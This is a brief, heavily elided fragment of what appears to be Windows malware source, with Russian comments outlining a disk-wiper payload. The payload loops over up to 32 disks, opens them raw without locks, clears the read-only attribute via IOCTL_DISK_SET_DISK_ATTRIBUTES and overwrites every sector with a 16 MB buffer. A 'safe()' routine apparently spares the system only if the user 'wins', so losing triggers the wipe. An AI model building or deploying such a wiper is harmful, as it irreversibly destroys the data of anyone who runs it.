...
// заметка*
// самый жирный код, который можно мутить в ring3, но...
// оффлайн-диски и железо/ядро не трогает
...
// если выиграл, система не будет тронута
// просто удаляем таск
void safe() {
...
/// payload описка:
// 1. лупим до 32 дисков
// 2. открываем напрямую, без блокировок
// 3. снимаем только программный readonly через IOCTL_DISK_SET_DISK_ATTRIBUTES
// 4. узнаём размер диска
// 5. затираем каждый сектор буфером 16МБ
